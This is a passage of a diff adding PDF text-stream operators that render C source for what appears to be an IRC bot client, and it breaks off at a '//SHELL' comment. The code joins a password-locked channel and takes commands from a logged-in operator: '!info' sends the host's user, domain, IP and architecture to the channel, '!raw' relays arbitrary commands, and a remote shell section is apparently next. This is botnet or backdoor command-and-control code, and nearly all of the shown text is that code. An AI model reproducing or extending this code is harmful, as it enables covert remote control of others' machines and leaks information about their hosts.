+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (len)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf 0 0.498 0.498 rg (0)Tj
+/F2 10 Tf 0 0 0 rg (\);)Tj
+T*
+T*
+(    )Tj
+/F1 10 Tf 0 0.498 0 rg (//Join&Set channel password)Tj
+T*
+(    )Tj
+0 0 0 rg (sprintf)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (snd)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf 0.498 0 0.498 rg ("JOIN %s %s\\n")Tj
+/F2 10 Tf 0 0 0 rg (,)Tj
+( )Tj
+/F1 10 Tf (channel)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (chanpass)Tj
+/F2 10 Tf (\);)Tj
+( )Tj
+/F1 10 Tf (len)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+/F1 10 Tf (strlen)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (snd)Tj
+/F2 10 Tf (\);)Tj
+( )Tj
+/F1 10 Tf (err)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+/F1 10 Tf (send)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (s)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (snd)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (len)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf 0 0.498 0.498 rg (0)Tj
+/F2 10 Tf 0 0 0 rg (\);)Tj
+T*
+(    )Tj
+/F1 10 Tf (sleep)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf 0 0.498 0.498 rg (1000)Tj
+/F2 10 Tf 0 0 0 rg (\);)Tj
+T*
+(    )Tj
+/F1 10 Tf (err)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+/F1 10 Tf (send)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (s)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (snd)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (len)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf 0 0.498 0.498 rg (0)Tj
+/F2 10 Tf 0 0 0 rg (\);)Tj
+T*
+(    )Tj
+/F1 10 Tf 0 0.498 0 rg (//mode #chan +k heslo)Tj
+T*
+(    )Tj
+0 0 0 rg (sleep)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf 0 0.498 0.498 rg (2000)Tj
+/F2 10 Tf 0 0 0 rg (\);)Tj
+T*
+(    )Tj
+/F1 10 Tf (sprintf)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (snd)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf 0.498 0 0.498 rg ("MODE %s +n+k %s\\n")Tj
+/F2 10 Tf 0 0 0 rg (,)Tj
+( )Tj
+/F1 10 Tf (channel)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (chanpass)Tj
+/F2 10 Tf (\);)Tj
+( )Tj
+/F1 10 Tf (len)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+/F1 10 Tf (strlen)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (snd)Tj
+/F2 10 Tf (\);)Tj
+( )Tj
+/F1 10 Tf (err)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+/F1 10 Tf (send)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (s)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (snd)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (len)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf 0 0.498 0.498 rg (0)Tj
+/F2 10 Tf 0 0 0 rg (\);)Tj
+T*
+(    )Tj
+/F1 10 Tf (sleep)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf 0 0.498 0.498 rg (1000)Tj
+/F2 10 Tf 0 0 0 rg (\);)Tj
+T*
+(    )Tj
+/F1 10 Tf (err)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+/F1 10 Tf (send)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (s)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (snd)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (len)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf 0 0.498 0.498 rg (0)Tj
+/F2 10 Tf 0 0 0 rg (\);)Tj
+T*
+(             )Tj
+T*
+(       )Tj
+T*
+(    )Tj
+/F1 10 Tf 0 0.498 0 rg (//Pozdravit)Tj
+T*
+(    )Tj
+0 0 0 rg (sprintf)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (msg)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf 0.498 0 0.498 rg ("Hello ;\), let my introduce myself... I am %s v%s")Tj
+/F2 10 Tf 0 0 0 rg (,)Tj
+( )Tj
+/F1 10 Tf (nick)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (version)Tj
+/F2 10 Tf (\);)Tj
+( )Tj
+/F1 10 Tf 0 0.498 0 rg (//Zprava)Tj
+T*
+(    )Tj
+0 0 0 rg (err)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+/F1 10 Tf (irc_sendmsg)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (s)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (channel)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (msg)Tj
+/F2 10 Tf (\);)Tj
+T*
+(    )Tj
+/F1 10 Tf (sprintf)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (msg)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf 0.498 0 0.498 rg ("!chanpass")Tj
+/F2 10 Tf 0 0 0 rg (\);)Tj
+( )Tj
+/F1 10 Tf 0 0.498 0 rg (//Pozadat opa o nastaveni hesla)Tj
+T*
+(    )Tj
+0 0 0 rg (err)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+/F1 10 Tf (irc_sendmsg)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (s)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (channel)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (msg)Tj
+/F2 10 Tf (\);)Tj
+T*
+(    )Tj
+T*
+(    )Tj
+/F1 10 Tf 0 0.498 0 rg (//Loop)Tj
+T*
+(    )Tj
+0 0 0 rg (err)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+/F1 10 Tf 0 0.498 0.498 rg (1)Tj
+/F2 10 Tf 0 0 0 rg (;)Tj
+T*
+(    )Tj
+0 0 0.498 rg (while)Tj
+0 0 0 rg (\()Tj
+( )Tj
+/F1 10 Tf (err)Tj
+( )Tj
+/F2 10 Tf (&&)Tj
+( )Tj
+/F1 10 Tf (err)Tj
+( )Tj
+/F2 10 Tf (!=)Tj
+( )Tj
+(-)Tj
+/F1 10 Tf 0 0.498 0.498 rg (1)Tj
+/F2 10 Tf 0 0 0 rg (\))Tj
+( )Tj
+({)Tj
+T*
+(             )Tj
+T*
+(             )Tj
+/F1 10 Tf 0 0.498 0 rg (//JOIN)Tj
+T*
+(             )Tj
+0 0 0 rg (sprintf)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (snd)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf 0.498 0 0.498 rg ("JOIN %s %s\\n")Tj
+/F2 10 Tf 0 0 0 rg (,)Tj
+( )Tj
+/F1 10 Tf (channel)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (chanpass)Tj
+/F2 10 Tf (\);)Tj
+( )Tj
+/F1 10 Tf (len)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+/F1 10 Tf (strlen)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (snd)Tj
+/F2 10 Tf (\);)Tj
+( )Tj
+/F1 10 Tf (err)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+/F1 10 Tf (send)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (s)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (snd)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (len)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf 0 0.498 0.498 rg (0)Tj
+/F2 10 Tf 0 0 0 rg (\);)Tj
+T*
+(             )Tj
+T*
+(             )Tj
+/F1 10 Tf 0 0.498 0 rg (//RECIEVE)Tj
+T*
+(             )Tj
+0 0 0 rg (memset)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (rcv)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf 0.498 0 0.498 rg ('\\0')Tj
+/F2 10 Tf 0 0 0 rg (,)Tj
+( )Tj
+/F1 10 Tf 0 0.498 0.498 rg (1024)Tj
+/F2 10 Tf 0 0 0 rg (\);)Tj
+T*
+(             )Tj
+/F1 10 Tf (sub)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+/F1 10 Tf 0 0.498 0.498 rg (0)Tj
+/F2 10 Tf 0 0 0 rg (;)Tj
+ET
+endstream
+endobj
+8 0 obj
+<</Length 8630>>
+stream
+BT 1 0 0 1 72 762 Tm
+/F2 10 Tf 0 0 0 rg (             )Tj
+/F1 10 Tf (err)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+/F1 10 Tf (recv)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (s)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (rcv)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf 0 0.498 0.498 rg (1024)Tj
+/F2 10 Tf 0 0 0 rg (,)Tj
+( )Tj
+/F1 10 Tf 0 0.498 0.498 rg (0)Tj
+/F2 10 Tf 0 0 0 rg (\);)Tj
+0 -12.0 TD
+(             )Tj
+/F1 10 Tf (printf)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf 0.498 0 0.498 rg ("%s")Tj
+/F2 10 Tf 0 0 0 rg (,)Tj
+( )Tj
+/F1 10 Tf (rcv)Tj
+/F2 10 Tf (\);)Tj
+T*
+(             )Tj
+T*
+(             )Tj
+/F1 10 Tf 0 0.498 0 rg (//PING-PONG)Tj
+T*
+(             )Tj
+/F2 10 Tf 0 0 0.498 rg (if)Tj
+( )Tj
+0 0 0 rg (\()Tj
+( )Tj
+(\()Tj
+/F1 10 Tf (sub)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+(\()Tj
+/F1 10 Tf (strstr)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (rcv)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf 0.498 0 0.498 rg ("PING :")Tj
+/F2 10 Tf 0 0 0 rg (\)\)\))Tj
+( )Tj
+(\))Tj
+( )Tj
+({)Tj
+T*
+(                )Tj
+/F1 10 Tf (sub)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+/F1 10 Tf (sub)Tj
+/F2 10 Tf (+)Tj
+/F1 10 Tf 0 0.498 0.498 rg (6)Tj
+/F2 10 Tf 0 0 0 rg (;)Tj
+T*
+(                )Tj
+/F1 10 Tf (sprintf)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (snd)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf 0.498 0 0.498 rg ("PONG :%s")Tj
+/F2 10 Tf 0 0 0 rg (,)Tj
+( )Tj
+/F1 10 Tf (sub)Tj
+/F2 10 Tf (\);)Tj
+T*
+(                )Tj
+/F1 10 Tf (len)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+/F1 10 Tf (strlen)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (snd)Tj
+/F2 10 Tf (\);)Tj
+T*
+(                )Tj
+/F1 10 Tf (err)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+/F1 10 Tf (send)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (s)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (snd)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (len)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf 0 0.498 0.498 rg (0)Tj
+/F2 10 Tf 0 0 0 rg (\);)Tj
+T*
+(                )Tj
+/F1 10 Tf (printf)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf 0.498 0 0.498 rg ("%s")Tj
+/F2 10 Tf 0 0 0 rg (,)Tj
+( )Tj
+/F1 10 Tf (snd)Tj
+/F2 10 Tf (\);)Tj
+T*
+(                )Tj
+(})Tj
+T*
+(             )Tj
+/F1 10 Tf (sub)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+/F1 10 Tf 0 0.498 0.498 rg (0)Tj
+/F2 10 Tf 0 0 0 rg (;)Tj
+T*
+(             )Tj
+T*
+(             )Tj
+0 0 0.498 rg (if)Tj
+( )Tj
+0 0 0 rg (\()Tj
+( )Tj
+(\()Tj
+/F1 10 Tf (sub)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+(\()Tj
+/F1 10 Tf (strstr)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (rcv)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf 0.498 0 0.498 rg (":!chanpass")Tj
+/F2 10 Tf 0 0 0 rg (\)\)\))Tj
+( )Tj
+(\))Tj
+( )Tj
+({)Tj
+T*
+(                )Tj
+/F1 10 Tf (printf)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf 0.498 0 0.498 rg ("!Setting chanpass\\n")Tj
+/F2 10 Tf 0 0 0 rg (\);)Tj
+T*
+(                )Tj
+/F1 10 Tf (sprintf)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (snd)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf 0.498 0 0.498 rg ("MODE %s +n+k %s\\n")Tj
+/F2 10 Tf 0 0 0 rg (,)Tj
+( )Tj
+/F1 10 Tf (channel)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (chanpass)Tj
+/F2 10 Tf (\);)Tj
+T*
+(                )Tj
+/F1 10 Tf (len)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+/F1 10 Tf (strlen)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (snd)Tj
+/F2 10 Tf (\);)Tj
+T*
+(                )Tj
+/F1 10 Tf (err)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+/F1 10 Tf (send)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (s)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (snd)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (len)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf 0 0.498 0.498 rg (0)Tj
+/F2 10 Tf 0 0 0 rg (\);)Tj
+T*
+(             )Tj
+(})Tj
+T*
+(             )Tj
+/F1 10 Tf (sub)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+/F1 10 Tf 0 0.498 0.498 rg (0)Tj
+/F2 10 Tf 0 0 0 rg (;)Tj
+T*
+(             )Tj
+T*
+(             )Tj
+/F1 10 Tf 0 0.498 0 rg (//LOGIN)Tj
+T*
+(             )Tj
+/F2 10 Tf 0 0 0.498 rg (if)Tj
+( )Tj
+0 0 0 rg (\()Tj
+( )Tj
+(\()Tj
+/F1 10 Tf (sub)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+(\()Tj
+/F1 10 Tf (strstr)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (rcv)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf 0.498 0 0.498 rg (":!login ")Tj
+/F2 10 Tf 0 0 0 rg (\)\)\))Tj
+( )Tj
+(\))Tj
+( )Tj
+({)Tj
+T*
+(                )Tj
+/F1 10 Tf (sub)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+/F1 10 Tf (sub)Tj
+/F2 10 Tf (+)Tj
+/F1 10 Tf 0 0.498 0.498 rg (8)Tj
+/F2 10 Tf 0 0 0 rg (;)Tj
+T*
+(                )Tj
+/F1 10 Tf (sprintf)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (passin)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf 0.498 0 0.498 rg ("%s")Tj
+/F2 10 Tf 0 0 0 rg (,)Tj
+( )Tj
+/F1 10 Tf (sub)Tj
+/F2 10 Tf (\);)Tj
+T*
+(                )Tj
+0 0 0.498 rg (if)Tj
+( )Tj
+0 0 0 rg (\()Tj
+( )Tj
+/F1 10 Tf (strstr)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (passin)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (pass)Tj
+/F2 10 Tf (\))Tj
+( )Tj
+(\))Tj
+( )Tj
+({)Tj
+(  )Tj
+/F1 10 Tf 0 0.498 0 rg (//Use this condition to check login.)Tj
+T*
+(                   )Tj
+0 0 0 rg (sprintf)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (msg)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf 0.498 0 0.498 rg ("Login succesful")Tj
+/F2 10 Tf 0 0 0 rg (\);)Tj
+T*
+(                   )Tj
+/F1 10 Tf (irc_sendmsg)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (s)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (channel)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (msg)Tj
+/F2 10 Tf (\);)Tj
+T*
+(                   )Tj
+/F1 10 Tf (printf)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf 0.498 0 0.498 rg ("\\n!!!Login succesful\\n")Tj
+/F2 10 Tf 0 0 0 rg (\);)Tj
+T*
+(                )Tj
+(})Tj
+( )Tj
+0 0 0.498 rg (else)Tj
+( )Tj
+0 0 0 rg ({)Tj
+T*
+(                   )Tj
+/F1 10 Tf (sprintf)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (msg)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf 0.498 0 0.498 rg ("Loged out")Tj
+/F2 10 Tf 0 0 0 rg (\);)Tj
+T*
+(                   )Tj
+/F1 10 Tf (irc_sendmsg)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (s)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (channel)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (msg)Tj
+/F2 10 Tf (\);)Tj
+T*
+(                   )Tj
+/F1 10 Tf (printf)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf 0.498 0 0.498 rg ("!!!Loged out\\n\\n")Tj
+/F2 10 Tf 0 0 0 rg (\);)Tj
+T*
+(                )Tj
+(})Tj
+T*
+(             )Tj
+(})Tj
+T*
+(             )Tj
+/F1 10 Tf (sub)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+/F1 10 Tf 0 0.498 0.498 rg (0)Tj
+/F2 10 Tf 0 0 0 rg (;)Tj
+T*
+(             )Tj
+T*
+(             )Tj
+/F1 10 Tf 0 0.498 0 rg (//IF LOGED IN:)Tj
+T*
+(             )Tj
+/F2 10 Tf 0 0 0.498 rg (if)Tj
+( )Tj
+0 0 0 rg (\()Tj
+( )Tj
+/F1 10 Tf (strstr)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (passin)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (pass)Tj
+/F2 10 Tf (\))Tj
+( )Tj
+(\))Tj
+( )Tj
+({)Tj
+T*
+(                  )Tj
+T*
+(               )Tj
+/F1 10 Tf 0 0.498 0 rg (//SAY)Tj
+T*
+(               )Tj
+/F2 10 Tf 0 0 0.498 rg (if)Tj
+( )Tj
+0 0 0 rg (\()Tj
+( )Tj
+(\()Tj
+/F1 10 Tf (sub)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+(\()Tj
+/F1 10 Tf (strstr)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (rcv)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf 0.498 0 0.498 rg (":!SAY ")Tj
+/F2 10 Tf 0 0 0 rg (\)\)\))Tj
+( )Tj
+(\))Tj
+( )Tj
+({)Tj
+T*
+(                  )Tj
+/F1 10 Tf (sub)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+/F1 10 Tf (sub)Tj
+/F2 10 Tf (+)Tj
+/F1 10 Tf 0 0.498 0.498 rg (6)Tj
+/F2 10 Tf 0 0 0 rg (;)Tj
+T*
+(                  )Tj
+/F1 10 Tf (sprintf)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (msg)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf 0.498 0 0.498 rg ("MSG: %s")Tj
+/F2 10 Tf 0 0 0 rg (,)Tj
+( )Tj
+/F1 10 Tf (sub)Tj
+/F2 10 Tf (\);)Tj
+( )Tj
+/F1 10 Tf 0 0.498 0 rg (//Zprava)Tj
+T*
+(                  )Tj
+0 0 0 rg (err)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+/F1 10 Tf (irc_sendmsg)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (s)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (channel)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (msg)Tj
+/F2 10 Tf (\);)Tj
+T*
+(                )Tj
+(})Tj
+T*
+(                )Tj
+/F1 10 Tf (sub)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+/F1 10 Tf 0 0.498 0.498 rg (0)Tj
+/F2 10 Tf 0 0 0 rg (;)Tj
+T*
+(             )Tj
+T*
+(                )Tj
+/F1 10 Tf 0 0.498 0 rg (//INFO \(USER, DOMAIN, IP, ARCHITECTURE\))Tj
+T*
+(                )Tj
+/F2 10 Tf 0 0 0.498 rg (if)Tj
+( )Tj
+0 0 0 rg (\()Tj
+( )Tj
+(\()Tj
+/F1 10 Tf (sub)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+(\()Tj
+/F1 10 Tf (strstr)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (rcv)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf 0.498 0 0.498 rg (":!info")Tj
+/F2 10 Tf 0 0 0 rg (\)\)\))Tj
+( )Tj
+(\))Tj
+( )Tj
+({)Tj
+T*
+(                   )Tj
+/F1 10 Tf (err)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+/F1 10 Tf (irc_sendmsg)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (s)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (channel)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (hostmsg)Tj
+/F2 10 Tf (\);)Tj
+T*
+(                )Tj
+(})Tj
+T*
+(                )Tj
+/F1 10 Tf (sub)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+/F1 10 Tf 0 0.498 0.498 rg (0)Tj
+/F2 10 Tf 0 0 0 rg (;)Tj
+T*
+(                )Tj
+T*
+(                )Tj
+/F1 10 Tf 0 0.498 0 rg (//TIME)Tj
+T*
+(                )Tj
+/F2 10 Tf 0 0 0.498 rg (if)Tj
+( )Tj
+0 0 0 rg (\()Tj
+( )Tj
+(\()Tj
+/F1 10 Tf (sub)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+(\()Tj
+/F1 10 Tf (strstr)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (rcv)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf 0.498 0 0.498 rg (":!time")Tj
+/F2 10 Tf 0 0 0 rg (\)\)\))Tj
+( )Tj
+(\))Tj
+( )Tj
+({)Tj
+T*
+(                       )Tj
+/F1 10 Tf (printf)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf 0.498 0 0.498 rg ("Time\\n")Tj
+/F2 10 Tf 0 0 0 rg (\);)Tj
+T*
+(                       )Tj
+/F1 10 Tf 0 0.498 0 rg (//struct tm t;)Tj
+ET
+endstream
+endobj
+9 0 obj
+<</Length 7408>>
+stream
+BT 1 0 0 1 72 762 Tm
+/F1 10 Tf 0 0.498 0 rg (                       )Tj
+0 -12.0 TD
+(                       )Tj
+0 0 0 rg (cas)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+/F1 10 Tf (time)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (NULL)Tj
+/F2 10 Tf (\);)Tj
+T*
+(                   )Tj
+/F1 10 Tf (p_st_cas)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+/F1 10 Tf (localtime)Tj
+/F2 10 Tf (\(&)Tj
+/F1 10 Tf (cas)Tj
+/F2 10 Tf (\);)Tj
+T*
+(                       )Tj
+T*
+(                   )Tj
+/F1 10 Tf (strftime)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (msg)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf 0 0.498 0.498 rg (512)Tj
+/F2 10 Tf 0 0 0 rg (,)Tj
+( )Tj
+/F1 10 Tf 0.498 0 0.498 rg ("%H:%M:%S \(%p\) - %d\(%A\) %m\(%B\) %Y - %Z")Tj
+/F2 10 Tf 0 0 0 rg (,)Tj
+( )Tj
+/F1 10 Tf (p_st_cas)Tj
+/F2 10 Tf (\);)Tj
+T*
+(                       )Tj
+/F1 10 Tf 0 0.498 0 rg (//strftime\(msg, 100, "%B %d, %Y", localtime\);)Tj
+T*
+(                       )Tj
+T*
+(                   )Tj
+(//sprintf\(msg, "Time not implementet yet...\\n"\);)Tj
+T*
+(                   )Tj
+0 0 0 rg (err)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+/F1 10 Tf (irc_sendmsg)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (s)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (channel)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (msg)Tj
+/F2 10 Tf (\);)Tj
+T*
+(                )Tj
+(})Tj
+T*
+(                )Tj
+/F1 10 Tf (sub)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+/F1 10 Tf 0 0.498 0.498 rg (0)Tj
+/F2 10 Tf 0 0 0 rg (;)Tj
+T*
+(                )Tj
+T*
+(                )Tj
+/F1 10 Tf 0 0.498 0 rg (//SEND RAW)Tj
+T*
+(               )Tj
+/F2 10 Tf 0 0 0.498 rg (if)Tj
+( )Tj
+0 0 0 rg (\()Tj
+( )Tj
+(\()Tj
+/F1 10 Tf (sub)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+(\()Tj
+/F1 10 Tf (strstr)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (rcv)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf 0.498 0 0.498 rg (":!raw ")Tj
+/F2 10 Tf 0 0 0 rg (\)\)\))Tj
+( )Tj
+(\))Tj
+( )Tj
+({)Tj
+T*
+(                  )Tj
+/F1 10 Tf (sub)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+/F1 10 Tf (sub)Tj
+/F2 10 Tf (+)Tj
+/F1 10 Tf 0 0.498 0.498 rg (6)Tj
+/F2 10 Tf 0 0 0 rg (;)Tj
+T*
+(                  )Tj
+/F1 10 Tf (len)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+/F1 10 Tf (strlen)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (sub)Tj
+/F2 10 Tf (\);)Tj
+T*
+(                  )Tj
+/F1 10 Tf (err)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+/F1 10 Tf (send)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (s)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (sub)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (len)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf 0 0.498 0.498 rg (0)Tj
+/F2 10 Tf 0 0 0 rg (\);)Tj
+T*
+(                )Tj
+(})Tj
+T*
+(                )Tj
+/F1 10 Tf (sub)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+/F1 10 Tf 0 0.498 0.498 rg (0)Tj
+/F2 10 Tf 0 0 0 rg (;)Tj
+T*
+(             )Tj
+T*
+(                )Tj
+/F1 10 Tf 0 0.498 0 rg (//SHELL)Tj
+T*
